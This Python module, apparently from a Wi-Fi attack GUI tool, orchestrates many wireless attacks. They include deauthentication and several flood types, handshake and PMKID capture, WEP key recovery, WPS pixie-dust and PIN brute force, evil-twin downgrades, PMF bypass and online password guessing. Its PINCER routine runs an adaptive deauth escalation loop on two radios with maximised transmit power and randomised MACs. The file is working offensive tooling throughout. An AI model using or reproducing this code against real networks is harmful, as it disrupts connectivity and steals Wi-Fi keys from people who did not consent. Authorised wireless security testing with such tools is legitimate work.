"""Attack orchestration logic extracted from gui/app.py.

AttackRunner holds the runtime state needed to run any GUI-triggered
attack (monitor interface, own MAC, capture/wordlist paths, stop event,
log/progress callbacks) and provides one method per attack. It does not
import tkinter or handle confirmation dialogs — App still owns UI/state
management and calls these methods inside _run_bg() background threads.
"""

from __future__ import annotations

import threading
import time
from collections.abc import Callable


class AttackRunner:
    """Thin orchestration layer between the Tkinter App and the attack
    implementations in attacks/, crack/, omni/, wep/, and wps/."""

    def __init__(
        self,
        mon_iface: str | None,
        own_mac: str | None,
        capture_dir: str,
        wordlist: str | None,
        stop_event: threading.Event,
        progress_fn: Callable[[str], None],
        log_fn: Callable[[str], None],
        watch_capture_fn: Callable[[str, threading.Event], None] | None = None,
        crack_proc_holder: dict | None = None,
        iface_ap: str | None = None,
    ):
        self.mon_iface = mon_iface
        self.own_mac = own_mac
        self.capture_dir = capture_dir
        self.wordlist = wordlist
        self._stop_event = stop_event
        self._progress_fn = progress_fn
        self._log = log_fn
        self._watch_capture_fn = watch_capture_fn
        self.iface_ap = iface_ap
        # Shared with App._crack_proc_holder so _stop_attack() can terminate
        # a crack subprocess started by OMNI/Smart's own crack stage, not
        # just the separate Captures-tab "Crack Selected" one.
        self._crack_proc_holder = crack_proc_holder if crack_proc_holder is not None else {}

    @property
    def _iface(self) -> str:
        if self.mon_iface is None:
            raise RuntimeError("monitor interface required")
        return self.mon_iface

    @property
    def _mac(self) -> str:
        if self.own_mac is None:
            raise RuntimeError("own MAC required")
        return self.own_mac

    # ------------------------------------------------------------------
    # Deauthentication
    # ------------------------------------------------------------------

    def _pmf_block_message(self, ap) -> str | None:
        """None if deauth is worth attempting against ap, else the reason
        it isn't -- same `secure.recommend_attack()` call run_smart() uses,
        so the deauth_all/deauth_client manual buttons (2026-08-30) give
        the identical PMF-aware verdict instead of silently sending frames
        the 2026-08-30 hwsim test proved have zero effect. pincer() does
        its own separate, simpler PMF check (skip the whole flow rather
        than a per-call verdict) instead of calling this."""
        if ap.pmf != "required":
            return None
        from ..secure import recommend_attack

        return recommend_attack(ap)["reason"]

    def deauth_all(self, ap) -> str:
        from ..attacks.deauth import deauth
        from ..frames import BROADCAST

        block = self._pmf_block_message(ap)
        if block:
            self._progress_fn(f"deauth: PMF required, skipping — {block}")
            return f"skipped — {block}"
        sent = deauth(
            self._iface, ap.bssid, client=BROADCAST, count=64, channel=ap.channel,
            progress_fn=self._progress_fn, stop_event=self._stop_event,
        )
        return f"sent {sent} deauth frames to broadcast"

    def deauth_client(self, ap, client: str) -> str:
        from ..attacks.deauth import deauth

        block = self._pmf_block_message(ap)
        if block:
            self._progress_fn(f"deauth: PMF required, skipping — {block}")
            return f"skipped — {block}"
        sent = deauth(
            self._iface, ap.bssid, client=client, count=64, channel=ap.channel,
            progress_fn=self._progress_fn, stop_event=self._stop_event,
        )
        return f"sent {sent} deauth frames to {client}"

    # ------------------------------------------------------------------
    # DoS / protocol-disruption floods (v2.4)
    # ------------------------------------------------------------------

    def csa_spoof(self, ap, new_channel: int, client: str | None = None) -> str:
        from ..attacks.csa_spoof import send_csa
        from ..frames import BROADCAST

        target = client or BROADCAST
        sent = send_csa(
            self._iface, ap.bssid, new_channel, client=target, count=10,
            channel=ap.channel, progress_fn=self._progress_fn, stop_event=self._stop_event,
        )
        return f"sent {sent} CSA frame(s) telling {target} to switch to channel {new_channel}"

    def eapol_flood(self, ap, count: int = 100) -> str:
        from ..attacks.eapol_flood import eapol_flood

        sent = eapol_flood(
            self._iface, ap.bssid, count=count, channel=ap.channel,
            progress_fn=self._progress_fn, stop_event=self._stop_event,
        )
        return f"sent {sent} EAPOL-Start frame(s) to {ap.bssid}"

    def auth_flood(self, ap, count: int = 100) -> str:
        from ..attacks.auth_flood import auth_flood

        sent = auth_flood(
            self._iface, ap.bssid, count=count, channel=ap.channel,
            progress_fn=self._progress_fn, stop_event=self._stop_event,
        )
        return f"sent {sent} auth request(s) to {ap.bssid}"

    def beacon_flood(self, channel: int | None, count: int = 100) -> str:
        from ..attacks.beacon_flood import beacon_flood

        sent = beacon_flood(
            self._iface, count=count, channel=channel,
            progress_fn=self._progress_fn, stop_event=self._stop_event,
        )
        return f"sent {sent} fake beacon(s)"

    def tkip_mic_flood(self, ap, client: str | None = None) -> str:
        from ..attacks.tkip_mic_flood import tkip_mic_flood
        from ..frames import BROADCAST

        target = client or BROADCAST
        sent = tkip_mic_flood(
            self._iface, ap.bssid, client=target, channel=ap.channel,
            progress_fn=self._progress_fn, stop_event=self._stop_event,
        )
        return f"sent {sent} bad-MIC frame(s) to {ap.bssid} (client={target})"

    def chaos(self, ap, client: str | None = None) -> str:
        """Run the coordinated multi-vector flood and return its summary.

        2026-09-26: the GUI twin of `atwa chaos`. It returns
        `ChaosResult.summary()`, which lists only the vectors that produced
        an observable effect -- deliberately not "sent N frames", because
        that is a transmission count and not evidence anything happened
        (the first bench run inverted its own verdicts on exactly that
        mistake; see chaos.py's own note). Broadcast unless a client is
        given; default vectors/tiers match the CLI's no-flag run.
        """
        from ..chaos import chaos
        from ..frames import BROADCAST

        result = chaos(
            self._iface, ap.bssid, client=client or BROADCAST, channel=ap.channel,
            progress_fn=self._progress_fn, stop_event=self._stop_event,
        )
        return result.summary()

    # ------------------------------------------------------------------
    # Native WPA/WEP captures
    # ------------------------------------------------------------------

    def pmkid(self, ap) -> str:
        from ..attacks.pmkid import capture_pmkid
        from ..storage import target_capture_dir

        line = capture_pmkid(
            self._iface, ap.bssid, self._mac, channel=ap.channel, essid=ap.ssid,
            stop_event=self._stop_event, progress_fn=self._progress_fn,
        )
        if line is None:
            return "no PMKID captured"
        out_dir = target_capture_dir(ap.ssid, ap.bssid)
        out_file = out_dir / f"pmkid_{int(time.time())}.22000"
        out_file.write_text(line + "\n")
        return f"saved to {out_file}"

    def handshake(self, ap) -> str:
        from ..attacks.handshake import capture_handshake
        from ..storage import target_capture_dir

        out_dir = target_capture_dir(ap.ssid, ap.bssid)
        out_file = out_dir / f"handshake_{int(time.time())}.pcap"
        watch_stop = threading.Event()
        if self._watch_capture_fn is not None:
            threading.Thread(
                target=self._watch_capture_fn, args=(str(out_file), watch_stop), daemon=True
            ).start()
        try:
            cap = capture_handshake(
                self._iface, ap.bssid, channel=ap.channel, timeout=60.0,
                outfile=str(out_file), stop_event=self._stop_event, progress_fn=self._progress_fn,
            )
        finally:
            watch_stop.set()
        if not cap.messages:
            return "no EAPOL traffic seen"
        statuses = [cap.status(a, c).value for a, c in cap.messages]
        return f"{len(cap.messages)} pair(s), statuses={statuses}, saved to {out_file}"

    def smart(self, ap) -> str:
        return self._omni_style(ap, "run_smart")

    def omni(self, ap) -> str:
        return self._omni_style(ap, "run")

    def _omni_style(self, ap, method: str) -> str:
        from ..crack.john import JohnCracker, JohnUnavailableError
        from ..omni import OmniOrchestrator

        cracker = None
        if self.wordlist:
            try:
                cracker = JohnCracker()
            except JohnUnavailableError as exc:
                self._log(f"warning: {exc} — will batch hashes but not crack")
        orch = OmniOrchestrator(
            self._iface, cracker=cracker, capture_dir=self.capture_dir,
            stop_event=self._stop_event, progress_fn=self._progress_fn,
            proc_holder=self._crack_proc_holder,
        )
        report = getattr(orch, method)(ap, wordlist=self.wordlist)
        self._log(report.summary())
        return "cracked" if report.cracked else "no crack"

    # ------------------------------------------------------------------
    # WEP
    # ------------------------------------------------------------------

    def wep(self, ap, key_len: int) -> str:
        from ..attacks.wep_crack import crack_wep

        key = crack_wep(
            self._iface, ap.bssid, self._mac, ap.ssid, key_len=key_len,
            channel=ap.channel, progress_fn=self._progress_fn, stop_event=self._stop_event,
        )
        return key.hex() if key else "no key recovered"

    def caffe_latte(self, client_mac: str, ap, key_len: int) -> str:
        from ..attacks.wep_client import caffe_latte

        key = caffe_latte(
            self._iface, client_mac, key_len=key_len, channel=ap.channel,
            stop_event=self._stop_event, progress_fn=self._progress_fn,
        )
        return key.hex() if key else "no key recovered"

    def hirte(self, client_mac: str, ap, key_len: int) -> str:
        from ..attacks.wep_client import hirte

        key = hirte(
            self._iface, client_mac, key_len=key_len, channel=ap.channel,
            stop_event=self._stop_event, progress_fn=self._progress_fn,
        )
        return key.hex() if key else "no key recovered"

    def chopchop(self, ap) -> str:
        from ..attacks.wep_client import chopchop_vendor

        result = chopchop_vendor(
            self._iface, ap.bssid, self._mac, channel=ap.channel,
            stop_event=self._stop_event, progress_fn=self._progress_fn,
        )
        return f"keystream saved to {result}" if result else "no packet decrypted"

    # ------------------------------------------------------------------
    # WPS
    # ------------------------------------------------------------------

    def wps_null_pin(self, ap) -> str:
        from ..attacks.wps import null_pin_attack

        outcome = null_pin_attack(
            self._iface, ap.bssid, ap.ssid, channel=ap.channel, progress_fn=self._progress_fn,
            stop_event=self._stop_event,
        )
        if outcome.network_key:
            return f"{outcome.outcome.value}: key={outcome.network_key}"
        return outcome.outcome.value

    def wps_pixie(self, ap) -> str:
        from ..attacks.wps import pixie_attempt

        result = pixie_attempt(
            self._iface, ap.bssid, ap.ssid, channel=ap.channel, progress_fn=self._progress_fn,
            stop_event=self._stop_event,
        )
        if result.outcome.name == "SUCCESS":
            return f"pixie-dust success: key={result.network_key}"
        suffix = f" — {result.detail}" if result.detail else ""
        return f"pixie-dust failed: {result.outcome.name}{suffix}"

    def wps_bruteforce(self, ap) -> str:
        from ..attacks.wps import wps_pin_bruteforce

        result = wps_pin_bruteforce(
            self._iface, ap.bssid, ap.ssid, channel=ap.channel,
            stop_event=self._stop_event, progress_fn=self._progress_fn,
        )
        if result.success:
            return f"PIN={result.pin} key={result.network_key}"
        if result.ap_setup_locked:
            return "AP setup locked"
        if result.aborted_lockout:
            return f"aborted after repeated timeouts ({result.attempts} attempts)"
        return f"no result ({result.attempts} attempts)"

    # ------------------------------------------------------------------
    # Portal-free rogue-AP workflows / Online Guess
    # ------------------------------------------------------------------

    def downgrade_twin(self, ap, iface_ap: str) -> str:
        from ..attacks.eviltwin import run_downgrade_twin
        from ..frames import BROADCAST
        from ..storage import target_capture_dir

        if ap.pmf == "required":
            self._progress_fn(
                "downgrade_twin: PMF required on the real AP — deauth rounds will be dropped, "
                "clients will only drift to the rogue twin if they reconnect on their own"
            )
        out_dir = target_capture_dir(ap.ssid, ap.bssid)
        out_file = out_dir / f"downgrade_twin_{int(time.time())}.pcap"
        result = run_downgrade_twin(
            iface_ap=iface_ap,
            iface_mon=self._iface,
            bssid=ap.bssid,
            ssid=ap.ssid,
            channel=ap.channel or 6,
            outfile=str(out_file),
            client=next(iter(ap.clients), BROADCAST),
            stop_event=self._stop_event,
            progress_fn=self._progress_fn,
        )
        return f"Downgrade Twin: {result.detail}"

    def pmf_bypass(self, ap, iface_ap: str) -> str:
        from ..attacks.eviltwin import run_pmf_bypass_chain
        from ..storage import target_capture_dir

        out_dir = target_capture_dir(ap.ssid, ap.bssid)
        out_file = out_dir / f"pmf_bypass_{int(time.time())}.pcap"
        # v2.5.4: two fixes here. (1) bssid= was never a parameter of
        # run_pmf_bypass_chain(), so this call raised TypeError on every
        # invocation; the chain derives its own rogue twin's BSSID from
        # iface_ap and has no use for the real AP's. (2) client= must be
        # None, not BROADCAST, when the scan hasn't seen a client for this
        # AP: the chain matches `client` against `iw ... station dump`
        # output, and ff:ff:ff:ff:ff:ff is never a station MAC, so passing
        # it guaranteed the "no client associated" timeout. None means
        # "act on whichever client shows up first" -- the behaviour the two
        # sibling methods below already get right for their own signatures.
        result = run_pmf_bypass_chain(
            iface_ap=iface_ap,
            iface_mon=self._iface,
            ssid=ap.ssid,
            channel=ap.channel or 6,
            outfile=str(out_file),
            client=next(iter(ap.clients), None),
            stop_event=self._stop_event,
            progress_fn=self._progress_fn,
        )
        return f"PMF Bypass: {result.detail}"

    def owe_downgrade(self, ap, iface_ap: str) -> str:
        from ..attacks.eviltwin import run_owe_downgrade
        from ..frames import BROADCAST

        result = run_owe_downgrade(
            iface_ap=iface_ap,
            iface_mon=self._iface,
            owe_bssid=ap.bssid,
            open_ssid=ap.owe_transition_ssid,
            channel=ap.channel or 6,
            client=next(iter(ap.clients), BROADCAST),
            stop_event=self._stop_event,
            progress_fn=self._progress_fn,
        )
        return f"OWE Downgrade: {result.detail}"

    def dragonblood(self, ap) -> str:
        """SAE (WPA3) timing side-channel wordlist pruning (CVE-2019-9494)
        -- see attacks/dragonblood.py's module docstring for the crypto
        details and its confidence caveats (the KDF byte layout is
        unverified against a real spec/capture). Only meaningful against
        an unpatched pre-hostapd-2.10 AP; against a patched one this
        correctly finds no usable timing signal."""
        from ..attacks.dragonblood import timing_prune_wordlist
        from ..storage import target_capture_dir

        if self.wordlist is None:
            return "no wordlist configured"
        with open(self.wordlist, encoding="utf-8", errors="ignore") as fh:
            wordlist = [line.strip() for line in fh if line.strip()]
        result = timing_prune_wordlist(
            self._iface, ap.bssid, wordlist, channel=ap.channel,
            stop_event=self._stop_event, progress_fn=self._progress_fn,
        )
        if result.pruned_wordlist:
            out_dir = target_capture_dir(ap.ssid, ap.bssid)
            out_file = out_dir / f"dragonblood_pruned_{int(time.time())}.txt"
            out_file.write_text("\n".join(result.pruned_wordlist) + "\n")
            return f"{result.detail} -> saved to {out_file}"
        return result.detail

    def online_guess(self, ap) -> str:
        from ..attacks.online import online_guess

        if self.wordlist is None:
            return "no wordlist configured"
        result = online_guess(
            self._iface, ap.bssid, ap.ssid, self._mac, self.wordlist,
            channel=ap.channel, pairwise_cipher=ap.pairwise_cipher, max_attempts=100,
            stop_event=self._stop_event, progress_fn=self._progress_fn,
        )
        if result.success:
            return f"password={result.password!r} after {result.attempts} attempt(s)"
        return f"{result.detail} ({result.attempts} attempt(s), {result.skipped_invalid} skipped)"

    # ------------------------------------------------------------------
    # PINCER (dual-Alfa)
    # ------------------------------------------------------------------

    def pincer(self, ap, scan_iface: str, attack_iface: str, randomize_mac: bool,
               watch_capture_fn: Callable[[str, threading.Event], None]) -> str:
        from ..attacks.deauth import deauth
        from ..attacks.handshake import (
            HandshakeCapture,
            HandshakeStatus,
            capture_handshake,
        )
        from ..attacks.logic import best_status
        from ..attacks.pmkid import capture_pmkid_passive
        from ..frames import BROADCAST
        from ..radio import (
            ensure_channel,
            get_channel_txpower,
            get_max_txpower,
            get_mode,
            set_managed_mode,
            set_monitor_mode,
            set_txpower,
        )
        from ..storage import target_capture_dir

        if ap.pmf == "required":
            self._log("PINCER: PMF required — deauth would be dropped, skipping round loop entirely")
            return "skipped — PMF required, deauth would be dropped"

        max_rounds = 12
        interval = 10
        out_dir = target_capture_dir(ap.ssid, ap.bssid)
        out_file = out_dir / f"pincer_{int(time.time())}.pcap"
        cap = HandshakeCapture()
        pmkid_found: list[str] = []
        capture_stop = threading.Event()
        listener: threading.Thread | None = None
        pmkid_sniffer: threading.Thread | None = None

        # Both mode-sets live INSIDE the try: if the second set_monitor_mode
        # raises, the finally below must still restore the first radio.
        scan_mon = attack_mon = None
        scan_perm_mac = attack_perm_mac = None
        try:
            self._log(f"PINCER: putting {scan_iface} (scan/listen) into monitor mode (randomize_mac={randomize_mac})")
            scan_mon, scan_perm_mac = set_monitor_mode(scan_iface, randomize_mac=randomize_mac)
            self._log(f"PINCER: {scan_mon} mode={get_mode(scan_mon)}")
            self._log(f"PINCER: putting {attack_iface} (attack/deauth) into monitor mode (randomize_mac={randomize_mac})")
            attack_mon, attack_perm_mac = set_monitor_mode(attack_iface, randomize_mac=randomize_mac)
            self._log(f"PINCER: {attack_mon} mode={get_mode(attack_mon)}")
            if ap.channel:
                ensure_channel(scan_mon, ap.channel)
                ensure_channel(attack_mon, ap.channel)
                self._log(f"PINCER: both radios parked on channel {ap.channel}")
            else:
                self._log("PINCER: no channel known for target — radios left on their current channel")

            # TX power optimization for the 3x3 AWUS1900 attack radio. The
            # BO regulatory domain advertises 20 dBm on 2.4 GHz but up to
            # 30 dBm on selected 5 GHz channels; use the selected channel's
            # advertised ceiling, never a hard-coded 20 dBm.
            max_tx = get_channel_txpower(attack_mon, ap.channel) if ap.channel else get_max_txpower(attack_mon)
            if max_tx is not None:
                self._log(f"PINCER: {attack_mon} channel {ap.channel or 'current'} TX limit: {max_tx} dBm")
                if set_txpower(attack_mon, max_tx):
                    self._log(f"PINCER: {attack_mon} TX power set to {max_tx} dBm")
                else:
                    self._log(f"PINCER: {attack_mon} TX power set failed (may already be at max)")
            else:
                self._log("PINCER: selected-channel TX limit unavailable; leaving driver TX power unchanged")

            # Client targeting: rank by signal strength, pick top 1-2
            if ap.client_signal:
                sorted_clients = sorted(ap.client_signal, key=lambda m: ap.client_signal[m], reverse=True)
                targets = sorted_clients[:2]
                self._log(f"PINCER: targeting strongest clients: {', '.join(targets)}")
            elif ap.clients:
                targets = [next(iter(ap.clients))]
                self._log(f"PINCER: targeting client {targets[0]} (no signal data)")
            else:
                targets = [BROADCAST]
                self._log("PINCER: no clients known — targeting broadcast")

            # Beacon timing: estimate interval from beacon_count and scan duration
            beacon_interval = None
            if ap.beacon_count > 1 and ap.first_seen and ap.last_seen:
                duration = ap.last_seen - ap.first_seen
                if duration > 0:
                    beacon_interval = duration / (ap.beacon_count - 1)
                    self._log(f"PINCER: estimated beacon interval: {beacon_interval * 1000:.0f}ms")

            def listen():
                capture_handshake(
                    scan_mon, ap.bssid, channel=ap.channel,
                    timeout=interval * max_rounds + 15, outfile=str(out_file),
                    stop_event=capture_stop, progress_fn=self._log, cap=cap,
                )

            def sniff_pmkid():
                """Passive PMKID sniffer on the scan radio.

                This listener is deliberately receive-only: the AWUS1900
                attack radio is the only PINCER transmitter.
                """
                line = capture_pmkid_passive(
                    scan_mon, ap.bssid, channel=ap.channel,
                    essid=ap.ssid, timeout=interval * max_rounds + 15,
                    stop_event=capture_stop, progress_fn=self._log,
                )
                if line:
                    pmkid_found.append(line)

            self._log(f"PINCER: {scan_mon} starting EAPOL listener + PMKID sniffer, writing to {out_file}")
            listener = threading.Thread(target=listen, daemon=True)
            listener.start()
            pmkid_sniffer = threading.Thread(target=sniff_pmkid, daemon=True)
            pmkid_sniffer.start()
            watch_stop = threading.Event()
            threading.Thread(target=watch_capture_fn, args=(str(out_file), watch_stop), daemon=True).start()

            # Adaptive deauth escalation loop
            burst_sizes = [8, 16, 32, 64]
            burst_idx = 0
            rounds_at_level = 0
            rounds_per_level = 3

            for round_no in range(1, max_rounds + 1):
                if self._stop_event.is_set():
                    break
                if pmkid_found:
                    self._log(f"PINCER: PMKID captured passively — stopping deauth after {round_no - 1} round(s)")
                    break
                if best_status(cap) is not HandshakeStatus.NONE:
                    self._log(f"PINCER: handshake material captured — stopping deauth after {round_no - 1} round(s)")
                    break

                burst = burst_sizes[burst_idx]
                # Beacon timing: fire ~100ms after expected beacon
                if beacon_interval is not None and round_no > 1:
                    time.sleep(0.1)  # post-beacon window

                # Cycle through target clients
                target = targets[(round_no - 1) % len(targets)]
                reason = (1, 2, 3, 6, 7, 8, 15)[(round_no - 1) % 7]

                sent = deauth(
                    attack_mon, ap.bssid, client=target, count=burst,
                    channel=ap.channel, reason=reason, progress_fn=self._log,
                    stop_event=self._stop_event,
                )
                if sent == 0:
                    self._log(f"PINCER deauth round {round_no}/{max_rounds}: did NOT go out (burst={burst}, target={target})")
                else:
                    self._log(f"PINCER deauth round {round_no}/{max_rounds}: sent {sent} frame(s) (burst={burst}, target={target}, reason={reason})")

                rounds_at_level += 1
                if rounds_at_level >= rounds_per_level and best_status(cap) is HandshakeStatus.NONE and burst_idx < len(burst_sizes) - 1:
                    burst_idx += 1
                    rounds_at_level = 0
                    self._log(f"PINCER: escalating burst size to {burst_sizes[burst_idx]}")

                self._stop_event.wait(interval)

            # Signal both long-lived sniffers before joining them. A normal
            # success (CHALLENGE/AUTHORIZED/PMKID) does not set the app-wide
            # stop event, so without this they could keep the scan radio's
            # raw socket open until their full timeout and race mode restore.
            capture_stop.set()
            if listener is not None:
                listener.join(timeout=5)
            if pmkid_sniffer is not None:
                pmkid_sniffer.join(timeout=5)
            watch_stop.set()
        finally:
            # Always release both raw sockets before changing the interface
            # mode. This also handles exceptions during setup or a deauth
            # round, where the normal post-loop join is skipped.
            capture_stop.set()
            if listener is not None:
                listener.join(timeout=5)
            if pmkid_sniffer is not None:
                pmkid_sniffer.join(timeout=5)
            self._log("PINCER: restoring radios to managed mode")
            if attack_mon is not None:
                try:
                    set_managed_mode(attack_mon, restore_mac=attack_perm_mac)
                except Exception:  # noqa: BLE001 - teardown must be best-effort
                    self._log(f"PINCER: failed to restore {attack_mon} to managed mode")
            if scan_mon is not None:
                try:
                    set_managed_mode(scan_mon, restore_mac=scan_perm_mac)
                except Exception:  # noqa: BLE001 - teardown must be best-effort
                    self._log(f"PINCER: failed to restore {scan_mon} to managed mode")
            self._log("PINCER: radios restored")

        if pmkid_found:
            out_22000 = out_dir / f"pincer_pmkid_{int(time.time())}.22000"
            out_22000.write_text(pmkid_found[0] + "\n")
            return f"PMKID captured -> {out_22000}"

        status = best_status(cap)
        if status is HandshakeStatus.AUTHORIZED:
            return f"AUTHORIZED handshake captured -> {out_file}"
        if status is HandshakeStatus.CHALLENGE:
            return f"CHALLENGE handshake captured (unverified by AP) -> {out_file}"
        return "stopped or exhausted rounds, no handshake material captured"
